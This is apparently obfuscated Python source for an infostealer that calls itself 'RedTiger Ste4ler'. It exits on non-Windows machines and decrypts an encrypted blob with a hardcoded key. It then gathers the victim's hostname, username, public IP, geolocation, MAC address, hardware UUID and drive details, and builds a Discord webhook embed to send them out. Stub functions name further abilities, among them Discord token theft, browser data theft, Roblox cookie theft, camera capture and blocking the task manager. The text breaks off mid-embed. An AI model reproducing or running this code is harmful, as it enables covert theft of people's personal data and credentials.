
import sys

def On1y_W1nd0w5():
    if sys.platform.startswith("win"):
        return False
    else:
        return True

try: EFOLRPCDMLWQATCXHOQOGOKMCMIICKLQGFMBILKVCFLYMHCKDKYHICYVANEMIYSZKIGQZCOVHKWXSFWAHXOTLJQCCUARH = On1y_W1nd0w5()
except: EFOLRPCDMLWQATCXHOQOGOKMCMIICKLQGFMBILKVCFLYMHCKDKYHICYVANEMIYSZKIGQZCOVHKWXSFWAHXOTLJQCCUARH = False

if EFOLRPCDMLWQATCXHOQOGOKMCMIICKLQGFMBILKVCFLYMHCKDKYHICYVANEMIYSZKIGQZCOVHKWXSFWAHXOTLJQCCUARH == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import threading
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import base64

def B10ck_K3y(): pass
def Unb10ck_K3y(): pass
def B10ck_T45k_M4n4g3r(): pass
def B10ck_M0u53(): pass
def B10ck_W3b5it3(): pass
def St4rtup(): pass
def Sy5t3m_Inf0(): pass
def Op3n_U53r_Pr0fi13_53tting5(): pass
def Scr33n5h0t(): pass
def C4m3r4_C4ptur3(): pass
def Di5c0rd_T0k3n(): pass
def Di5c0rd_inj3c710n(): pass
def Br0w53r_5t341(): pass
def R0b10x_C00ki3(): pass
def F4k3_3rr0r(): pass
def Sp4m_0p3n_Pr0gr4m(): pass
def Sp4m_Cr34t_Fil3(): pass
def Shutd0wn(): pass
def Sp4m_Opti0ns(): pass
def R3st4rt(): pass

def Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def Decrypt(MSUHLYHOHVUTTBSPOBBPHACDKVCPUXPLKTEESNBFIKWFRWVADDJC, v4r_key):
    def DeriveKey(v4r_password, v4r_salt):
        v4r_kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=v4r_salt, iterations=100000, backend=default_backend())
        if isinstance(v4r_password, str):  
            v4r_password = v4r_password.encode()  
        return v4r_kdf.derive(v4r_password)

    MSUHLYHOHVUTTBSPOBBPHACDKVCPUXPLKTEESNBFIKWFRWVADDJC_data = base64.b64decode(MSUHLYHOHVUTTBSPOBBPHACDKVCPUXPLKTEESNBFIKWFRWVADDJC)
    v4r_salt = MSUHLYHOHVUTTBSPOBBPHACDKVCPUXPLKTEESNBFIKWFRWVADDJC_data[:16]
    v4r_iv = MSUHLYHOHVUTTBSPOBBPHACDKVCPUXPLKTEESNBFIKWFRWVADDJC_data[16:32]
    MSUHLYHOHVUTTBSPOBBPHACDKVCPUXPLKTEESNBFIKWFRWVADDJC_data = MSUHLYHOHVUTTBSPOBBPHACDKVCPUXPLKTEESNBFIKWFRWVADDJC_data[32:]
    v4r_derived_key = DeriveKey(v4r_key, v4r_salt)
    v4r_cipher = Cipher(algorithms.AES(v4r_derived_key), modes.CBC(v4r_iv), backend=default_backend())
    v4r_decryptor = v4r_cipher.decryptor()
    v4r_decrypted_data = v4r_decryptor.update(MSUHLYHOHVUTTBSPOBBPHACDKVCPUXPLKTEESNBFIKWFRWVADDJC_data) + v4r_decryptor.finalize()
    v4r_unpadder = padding.PKCS7(128).unpadder()
    v4r_original_data = v4r_unpadder.update(v4r_decrypted_data) + v4r_unpadder.finalize()
    return v4r_original_data.decode()

JFIBIADKXCTZFJXJIJDNEWRRYOIYEYMKKNKPOMZOJBUBZEKOZDCKJGITDAFJKOHMFANGOLOQGVWCAVGBXZJWPZFLNYJYVMDSPWD = r"""
I9YTkwmZ77kg3H4Lp21sIfNYsqFKjPcp0TekhEwHHWaK5DFQ7vqWGVP/vw9sbFfKpTxRl1j2N7bUCbK2G9nzh44HarzeN2HoSXGDrvswieqvj27lKT6JpQ1pYRQgn9zqrZgy3TNRneWVs8lcM/UaV6uaQQ4pldGgn741r8DdbPTiOKBLOXQnd1Ll4sS2bOTMXD8JrLQELpKL62SzNCNrrQ==
"""
LHSQIUTYQRMQADIZSISYYPZLMTSPUPHBPDXSZRZLTZITNYBSXCHDHTNCEQKMSIMOKIOOKCJLSV = "PxgQjuhgYJiNQpNmspIgECAABvktyDJFlyBuYQuynFXEpTMsJSKVqTiegZdrcclMEDjsrCpiWiwQsOtBqCkYdVBAIMsEXrdWHgKHJbatcXchgwYNTHJMaZDAljrBEQmKF"
EPOOTFAQFFJQMFYYFNAFSASQFDBNUUEECLXRJCNTCAXKFWPCFSBVPLUCMCYSJMA = "redtiger.shop"
UNOJDNHEAGYTOMXWQKLCRQRKXEJGNXBSZSEMJYENYNIBOLJFVTFWFUXPOCZBXKVTZZBNPHZYPQ = 0xa80505
NKLPZURQIDGDUWYJSAKOWUZGLVZXGZSKCTGHMBPUYWTMBUGKIYYIXOBVXIKF = "RedTiger Ste4ler"
GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD = "https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/RedTiger-Logo.png?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&"
CCSVHPAVPVWFHDMNWIECAIKJKTEBVENVWINJUCIWZLBDPZILRQYSGFRURVFU = "RedTiger Ste4ler - github.com/loxy0dev/RedTiger-Tools"
PCFLFLFXCOQIAGUUWFARFICGTDHHCBFLWYZSHABKZNOIAMVQSMTXFGSSQVMQC = {
        "text": CCSVHPAVPVWFHDMNWIECAIKJKTEBVENVWINJUCIWZLBDPZILRQYSGFRURVFU,
        "icon_url": GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD,
        }
                 
KYWRKCWTNYORVMKYODCDUCGZRBRRVKCOPUZXBPTUYZQXMHLNOXIRFBJTFTJZYXLIEWUUAF = Decrypt(JFIBIADKXCTZFJXJIJDNEWRRYOIYEYMKKNKPOMZOJBUBZEKOZDCKJGITDAFJKOHMFANGOLOQGVWCAVGBXZJWPZFLNYJYVMDSPWD, LHSQIUTYQRMQADIZSISYYPZLMTSPUPHBPDXSZRZLTZITNYBSXCHDHTNCEQKMSIMOKIOOKCJLSV)

try: VOKPYUJHPXIKZXKHLSIKCKWTFOJIDKRZGUTWEXMWIMZSTBFZKROASKLNVLNWMHJNWBV = socket.gethostname()
except: VOKPYUJHPXIKZXKHLSIKCKWTFOJIDKRZGUTWEXMWIMZSTBFZKROASKLNVLNWMHJNWBV = "None"

try: WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ = os.getlogin()
except: WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ = "None"

try: KNTHCVSRNOFUNNXDROWCPXSPFPRWTDOQFUREZIOGRYNIMWESAIA = win32api.GetUserNameEx(win32api.NameDisplay)
except: KNTHCVSRNOFUNNXDROWCPXSPFPRWTDOQFUREZIOGRYNIMWESAIA = "None"

try: ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS = "None"

try: FSKPVSBHJWUBXNVMQKGKOYOOITRXBKDEYDGIFCCMFPNGXQUMJSSKTRQUXGDXCRM = socket.gethostbyname(socket.gethostname())
except: FSKPVSBHJWUBXNVMQKGKOYOOITRXBKDEYDGIFCCMFPNGXQUMJSSKTRQUXGDXCRM = "None"

try:
    RWMCMAPDBHLLIYZAOBGTEEQFBPJIEFBAYUFLVBWHKCIOLCDLVWCMFFXSWNQLUONTDDULCJSSMPKWXQTQNXIYBDDFWPPFXEF = requests.get(f"https://{EPOOTFAQFFJQMFYYFNAFSASQFDBNUUEECLXRJCNTCAXKFWPCFSBVPLUCMCYSJMA}/api/ip/ip={ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS}")
    GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ = RWMCMAPDBHLLIYZAOBGTEEQFBPJIEFBAYUFLVBWHKCIOLCDLVWCMFFXSWNQLUONTDDULCJSSMPKWXQTQNXIYBDDFWPPFXEF.json()

    THZZZVNEVLHSHXJNNWENBVVMUWKXMNVNHZMONVUFTQEISDKAUASOEVTPPVBTIXIPELQQRORXAPJZADSQMUS = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('country', "None")
    THZZZVNEVLHSHXJNNWENBVVMUWKXMNVNHZMONVUFTQEISDKAUASOEVTPPVBTIXIPELQQRORXAPJZADSQMUS_code = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('country_code', "None")
    UDDHJTEWMPRYODHREEIWXVZGXCEYGOSKIZBGOVVVQMVZCOQRTOHJKETX = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('region', "None")
    UDDHJTEWMPRYODHREEIWXVZGXCEYGOSKIZBGOVVVQMVZCOQRTOHJKETX_code = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('region_code', "None")
    JQIBDKWWEYNDHPFAWOAHVLLUKPOGHUUOMCLUXYMBXEYLJORXWEJWATCEWOGVTGEWTXSJIBKHNHOBZI = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('zip', "None")
    WKHTMOQTYZAQLSQWGECPUQXBYTUJPLWFNVPGFXLJZZHQGBMUBXIZHUKOPJVREMFYZIBRSLOUZLZUSGHLMLULKUHAQPZVDOUNIR = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('city', "None")
    OOUUPSVCJCGORYWJTKHUZEEPHXKNAJMILPBNUPLCJLUKQOMXKWAZNSGKMNCWIQYWUSNCWFXVX = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('latitude', "None")
    JLUHHRXHDURVIUNZMYEQOHVOQSGBHCHELRJPQDCBWVQRSTRLCGRFHRTYJIIDFROZEDAWSFBXIDQFBTVKXSENWPRQOZNVED = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('longitude', "None")
    IJIRZIBZWAWJRBNSRKWCASAAGEHADBYRZJVHFBTSCRXEQFCKVGVAHZNWANTJOXALGTFVMQGFPTGWSVWRJGGHCILLOZPDF = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('timezone', "None")
    KKFJQILNLQLKAOLXGABVHJMXHWTJKNHALFWEHGBGSQAJHGQXYOIF = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('isp', "None")
    CEILCRYBFZNMTIZFKKXOLYDXFISTNWRTLHCVQWOFECDSEOLITOVNAJEJVWXPJEIGICUVKNMHYLXLVREJTTNRC = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('org', "None")
    HZHLOPDOOLZEORVXFQJUQNDHQFEJFWZFMRERGCWBENICHJHKPZRMUFEGRHYYXEEQMZEIKZBKNUYM = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('as', "None")
except:
    RWMCMAPDBHLLIYZAOBGTEEQFBPJIEFBAYUFLVBWHKCIOLCDLVWCMFFXSWNQLUONTDDULCJSSMPKWXQTQNXIYBDDFWPPFXEF = requests.get(f"http://ip-api.com/json/{ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS}")
    GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ = RWMCMAPDBHLLIYZAOBGTEEQFBPJIEFBAYUFLVBWHKCIOLCDLVWCMFFXSWNQLUONTDDULCJSSMPKWXQTQNXIYBDDFWPPFXEF.json()

    THZZZVNEVLHSHXJNNWENBVVMUWKXMNVNHZMONVUFTQEISDKAUASOEVTPPVBTIXIPELQQRORXAPJZADSQMUS = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('country', "None")
    THZZZVNEVLHSHXJNNWENBVVMUWKXMNVNHZMONVUFTQEISDKAUASOEVTPPVBTIXIPELQQRORXAPJZADSQMUS_code = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('countryCode', "None")
    UDDHJTEWMPRYODHREEIWXVZGXCEYGOSKIZBGOVVVQMVZCOQRTOHJKETX = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('regionName', "None")
    UDDHJTEWMPRYODHREEIWXVZGXCEYGOSKIZBGOVVVQMVZCOQRTOHJKETX_code = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('region', "None")
    JQIBDKWWEYNDHPFAWOAHVLLUKPOGHUUOMCLUXYMBXEYLJORXWEJWATCEWOGVTGEWTXSJIBKHNHOBZI = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('zip', "None")
    WKHTMOQTYZAQLSQWGECPUQXBYTUJPLWFNVPGFXLJZZHQGBMUBXIZHUKOPJVREMFYZIBRSLOUZLZUSGHLMLULKUHAQPZVDOUNIR = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('city', "None")
    OOUUPSVCJCGORYWJTKHUZEEPHXKNAJMILPBNUPLCJLUKQOMXKWAZNSGKMNCWIQYWUSNCWFXVX = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('lat', "None")
    JLUHHRXHDURVIUNZMYEQOHVOQSGBHCHELRJPQDCBWVQRSTRLCGRFHRTYJIIDFROZEDAWSFBXIDQFBTVKXSENWPRQOZNVED = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('lon', "None")
    IJIRZIBZWAWJRBNSRKWCASAAGEHADBYRZJVHFBTSCRXEQFCKVGVAHZNWANTJOXALGTFVMQGFPTGWSVWRJGGHCILLOZPDF = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('timezone', "None")
    KKFJQILNLQLKAOLXGABVHJMXHWTJKNHALFWEHGBGSQAJHGQXYOIF = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('isp', "None")
    CEILCRYBFZNMTIZFKKXOLYDXFISTNWRTLHCVQWOFECDSEOLITOVNAJEJVWXPJEIGICUVKNMHYLXLVREJTTNRC = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('org', "None")
    HZHLOPDOOLZEORVXFQJUQNDHQFEJFWZFMRERGCWBENICHJHKPZRMUFEGRHYYXEEQMZEIKZBKNUYM = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('as', "None")

def Sy5t3m_Inf0():
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    from discord import SyncWebhook, Embed

    try: LLLQKSOVBLTSIYFHIMEMJCYOQKQGUCNYHNSOCPLCKOUDDCUKBH = {platform.system()}
    except: LLLQKSOVBLTSIYFHIMEMJCYOQKQGUCNYHNSOCPLCKOUDDCUKBH = "None"

    try: DDSALDPGHCHVLCIVCGVWBNGZNJFKUEFMVNTIKRVBOIUWITWNNPLNBFJKUVIOEOVJJZWYGWQSHXGXUOGNPRNAOMEFVWKQCYEAP = platform.version()
    except: DDSALDPGHCHVLCIVCGVWBNGZNJFKUEFMVNTIKRVBOIUWITWNNPLNBFJKUVIOEOVJJZWYGWQSHXGXUOGNPRNAOMEFVWKQCYEAP = "None"

    try: EXJZKMPVDPSBUSKZCQAHDWQEKMTUEBWLFGPATVMAPMUZNBRMHSVQBAM = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: EXJZKMPVDPSBUSKZCQAHDWQEKMTUEBWLFGPATVMAPMUZNBRMHSVQBAM = "None"

    try: YUSYQLWHBHNWHQJTUFXEOJQUQBZRPPKGIXMOUZAJTBAGDCYNWTWROLYFPYTVASIVSDDLYRVJAGTJWQTYWJCLBTHGGVL = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: YUSYQLWHBHNWHQJTUFXEOJQUQBZRPPKGIXMOUZAJTBAGDCYNWTWROLYFPYTVASIVSDDLYRVJAGTJWQTYWJCLBTHGGVL = "None"

    try: SJIVOPZAOJTIEUMWXZYGCVBRXSJGFCJFFOHIFHKYUGVGBGNZZXGJOSCVHVBULWQSBNQSOOMNJYNMMMFIJ = round(psutil.virtual_memory().total / (1024**3), 2)
    except: SJIVOPZAOJTIEUMWXZYGCVBRXSJGFCJFFOHIFHKYUGVGBGNZZXGJOSCVHVBULWQSBNQSOOMNJYNMMMFIJ = "None"

    try: LCOOSDANXZPKWLUGHFFRSBOCNQOQHAUVSZCIXXRHYOBSPVWGWGIWYNDVIVKJKTPYXHLARPKRPITHTNYHMATYCZNGAEKIE = platform.processor()
    except: LCOOSDANXZPKWLUGHFFRSBOCNQOQHAUVSZCIXXRHYOBSPVWGWGIWYNDVIVKJKTPYXHLARPKRPITHTNYHMATYCZNGAEKIE = "None"

    try: EBLCLGOAQJLIAZOPLDCPHGYZPMNOYHPHXGPUHSCWAKIREKIHJULSTHEMLSHLKXKWOFXTOTR = psutil.cpu_count(logical=False)
    except: EBLCLGOAQJLIAZOPLDCPHGYZPMNOYHPHXGPUHSCWAKIREKIHJULSTHEMLSHLKXKWOFXTOTR = "None"

    try: NQJMGPDURFSEGCTNTENJIXWSPTKGTIVKZTTVXYKZLWUFXZJDQTHBWNDWVCFXLDMYTGCMIEQLEMQHCGYJINFWNRAZE = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: NQJMGPDURFSEGCTNTENJIXWSPTKGTIVKZTTVXYKZLWUFXZJDQTHBWNDWVCFXLDMYTGCMIEQLEMQHCGYJINFWNRAZE = "None"

    try:
        WGQTAQPLYXCMTKJZEZIZNZNYPDYRHIIIXQSMHXTHEYTOIYJBOOYACFBAOCJZCPPIOXLPMFM = []
        OSGNZWDSEMZRAQGUBFWYUAMZZRNAYIDTUEMWJXHZZVJDYQKLVFJPHNMPMEMEWHGMUSSMJUDLF = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if OSGNZWDSEMZRAQGUBFWYUAMZZRNAYIDTUEMWJXHZZVJDYQKLVFJPHNMPMEMEWHGMUSSMJUDLF & 1:
                TFYRLNJIWHPNNXEJQEAPGTCVYWQPCDGOWUVGBTBOPTWUNODFKZAHXUQZKZMSLLBCWZUGQDESZPDBKHHESUWW = v4r_letter + ":\\"
                try:
                    LAVKCWAOBYDDGBTLRKGRWRTVQBRIBJTWBPHTPQIFPYOOTSGHNVOZCKQGE = ctypes.c_ulonglong(0)
                    FPURNVMADULPZBASSHGJDNEJVHBVMJCMDGNTQJUNYCGBQCCNUHCZCDPILBXYDJHDNKK = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(TFYRLNJIWHPNNXEJQEAPGTCVYWQPCDGOWUVGBTBOPTWUNODFKZAHXUQZKZMSLLBCWZUGQDESZPDBKHHESUWW), None, ctypes.pointer(FPURNVMADULPZBASSHGJDNEJVHBVMJCMDGNTQJUNYCGBQCCNUHCZCDPILBXYDJHDNKK), ctypes.pointer(LAVKCWAOBYDDGBTLRKGRWRTVQBRIBJTWBPHTPQIFPYOOTSGHNVOZCKQGE))
                    NZFNAKMOUQQNGTEDRHKRQDNHLQDHOAAUXDZEXNKLPXTFETWTVFLDPTKRQMODDRHGWCWOFMBQUMLGNLNKKBPW = FPURNVMADULPZBASSHGJDNEJVHBVMJCMDGNTQJUNYCGBQCCNUHCZCDPILBXYDJHDNKK.value
                    OJXZONOVZZXFREBQRTKORTWMDPRBSGPOSSBCCQCIMVWWYYQCKWSUXBLQKCQUCZYESVCTUHHHUWNPMRJLVYXQM = LAVKCWAOBYDDGBTLRKGRWRTVQBRIBJTWBPHTPQIFPYOOTSGHNVOZCKQGE.value
                    IUYLAWMGBXBUHXTXJDTENDPAMQUKKGUGETNJAHSLGCZRHHDXXSQHTSPQOCDRAMGDX = NZFNAKMOUQQNGTEDRHKRQDNHLQDHOAAUXDZEXNKLPXTFETWTVFLDPTKRQMODDRHGWCWOFMBQUMLGNLNKKBPW - OJXZONOVZZXFREBQRTKORTWMDPRBSGPOSSBCCQCIMVWWYYQCKWSUXBLQKCQUCZYESVCTUHHHUWNPMRJLVYXQM
                    JPONDPMOCJUDJJELOAVSTJSVWJWFZLHOHYXDGKIGSVVAEHMVBQOJEXPYG = win32api.GetVolumeInformation(TFYRLNJIWHPNNXEJQEAPGTCVYWQPCDGOWUVGBTBOPTWUNODFKZAHXUQZKZMSLLBCWZUGQDESZPDBKHHESUWW)[0]
                    drive = {
                        'drive': TFYRLNJIWHPNNXEJQEAPGTCVYWQPCDGOWUVGBTBOPTWUNODFKZAHXUQZKZMSLLBCWZUGQDESZPDBKHHESUWW,
                        'total': NZFNAKMOUQQNGTEDRHKRQDNHLQDHOAAUXDZEXNKLPXTFETWTVFLDPTKRQMODDRHGWCWOFMBQUMLGNLNKKBPW,
                        'free': OJXZONOVZZXFREBQRTKORTWMDPRBSGPOSSBCCQCIMVWWYYQCKWSUXBLQKCQUCZYESVCTUHHHUWNPMRJLVYXQM,
                        'used': IUYLAWMGBXBUHXTXJDTENDPAMQUKKGUGETNJAHSLGCZRHHDXXSQHTSPQOCDRAMGDX,
                        'name': JPONDPMOCJUDJJELOAVSTJSVWJWFZLHOHYXDGKIGSVVAEHMVBQOJEXPYG,
                    }
                    WGQTAQPLYXCMTKJZEZIZNZNYPDYRHIIIXQSMHXTHEYTOIYJBOOYACFBAOCJZCPPIOXLPMFM.append(drive)
                except:
                    ()
            OSGNZWDSEMZRAQGUBFWYUAMZZRNAYIDTUEMWJXHZZVJDYQKLVFJPHNMPMEMEWHGMUSSMJUDLF >>= 1

        LVBQKEFVBFPQPHSHSCKPUYDCLUTYWTKSUJJQWCCHFNLTASUGPSGIONRIBQ = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in WGQTAQPLYXCMTKJZEZIZNZNYPDYRHIIIXQSMHXTHEYTOIYJBOOYACFBAOCJZCPPIOXLPMFM:
            YNBRMHLUPJPPGWNEPLEFKXFSUDSRALWYLRFFXZTPLPKSCKYTDWSXCJAX = (v4r_drive['used'] / v4r_drive['total']) * 100
            OJXZONOVZZXFREBQRTKORTWMDPRBSGPOSSBCCQCIMVWWYYQCKWSUXBLQKCQUCZYESVCTUHHHUWNPMRJLVYXQM_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            NZFNAKMOUQQNGTEDRHKRQDNHLQDHOAAUXDZEXNKLPXTFETWTVFLDPTKRQMODDRHGWCWOFMBQUMLGNLNKKBPW_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            YNBRMHLUPJPPGWNEPLEFKXFSUDSRALWYLRFFXZTPLPKSCKYTDWSXCJAX_str = "{:.2f}%".format(YNBRMHLUPJPPGWNEPLEFKXFSUDSRALWYLRFFXZTPLPKSCKYTDWSXCJAX)
            LVBQKEFVBFPQPHSHSCKPUYDCLUTYWTKSUJJQWCCHFNLTASUGPSGIONRIBQ += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   OJXZONOVZZXFREBQRTKORTWMDPRBSGPOSSBCCQCIMVWWYYQCKWSUXBLQKCQUCZYESVCTUHHHUWNPMRJLVYXQM_gb,
                                                                   NZFNAKMOUQQNGTEDRHKRQDNHLQDHOAAUXDZEXNKLPXTFETWTVFLDPTKRQMODDRHGWCWOFMBQUMLGNLNKKBPW_gb,
                                                                   YNBRMHLUPJPPGWNEPLEFKXFSUDSRALWYLRFFXZTPLPKSCKYTDWSXCJAX_str,
                                                                   v4r_drive['name'])
    except:
        LVBQKEFVBFPQPHSHSCKPUYDCLUTYWTKSUJJQWCCHFNLTASUGPSGIONRIBQ = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if is_portable():
            SOTBMCLTMJUMXDSIBOTQKETNQSQMFOXIHGWAMFCAXXNBWUBJIYKLKCYBWIOZNNTRSLAURGJCHBAKUPMBXXME = 'Pc Portable'
        else:
            SOTBMCLTMJUMXDSIBOTQKETNQSQMFOXIHGWAMFCAXXNBWUBJIYKLKCYBWIOZNNTRSLAURGJCHBAKUPMBXXME = 'Pc Fixed'
    except:
        SOTBMCLTMJUMXDSIBOTQKETNQSQMFOXIHGWAMFCAXXNBWUBJIYKLKCYBWIOZNNTRSLAURGJCHBAKUPMBXXME = "None"

    try: YQCGXLWUVKPPFMSZDMQGGXSXMTUHNZEOXOZXQXEGEPIIHFMYNCVSNBPMAMUXYEWWMIYMDYOFLSQDLFWGWTUIJJD = len(screeninfo.get_monitors())
    except: YQCGXLWUVKPPFMSZDMQGGXSXMTUHNZEOXOZXQXEGEPIIHFMYNCVSNBPMAMUXYEWWMIYMDYOFLSQDLFWGWTUIJJD = "None"

    embed = Embed(title=f'System Info `{WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ} "{ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS}"`:', color=UNOJDNHEAGYTOMXWQKLCRQRKXEJGNXBSZSEMJYENYNIBOLJFVTFWFUXPOCZBXKVTZZBNPHZYPQ)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {VOKPYUJHPXIKZXKHLSIKCKWTFOJIDKRZGUTWEXMWIMZSTBFZKROASKLNVLNWMHJNWBV}
Username    : {WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ}
DisplayName : {KNTHCVSRNOFUNNXDROWCPXSPFPRWTDOQFUREZIOGRYNIMWESAIA}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {SOTBMCLTMJUMXDSIBOTQKETNQSQMFOXIHGWAMFCAXXNBWUBJIYKLKCYBWIOZNNTRSLAURGJCHBAKUPMBXXME}
Exploitation  : {LLLQKSOVBLTSIYFHIMEMJCYOQKQGUCNYHNSOCPLCKOUDDCUKBH} {DDSALDPGHCHVLCIVCGVWBNGZNJFKUEFMVNTIKRVBOIUWITWNNPLNBFJKUVIOEOVJJZWYGWQSHXGXUOGNPRNAOMEFVWKQCYEAP}
